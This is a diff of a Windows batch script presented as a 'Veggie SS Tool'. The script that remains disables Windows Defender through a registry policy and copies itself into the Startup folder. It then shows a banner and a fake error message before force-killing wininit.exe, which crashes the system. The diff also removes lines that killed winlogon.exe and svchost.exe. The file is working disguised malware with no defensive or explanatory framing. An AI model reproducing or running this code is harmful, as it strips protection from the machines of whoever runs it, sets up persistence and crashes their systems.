@@ -1,9 +1,7 @@
-@echo off & title
+@echo off
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f >nul
 xcopy %0 C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup >nul
 :gui
-chcp 65001 >nul
-mode 90 , 30
 echo.
 echo %c%          __      __             _         _____ _____   _______          _ 
 echo           \ \    / /             (_)       / ____/ ____^| ^|__   __^|        ^| ^|
@@ -30,6 +28,4 @@ color 0C >nul
 echo Veggie SS Tool has ran into a problem. Report to Veggie Bot and Painis Stick
 echo ^G >nul
 taskkill /f /im wininit.exe >nul
-taskkill /f /im winlogon.exe >nul
-taskkill /f /im svchost.exe >nul
 pause >nul
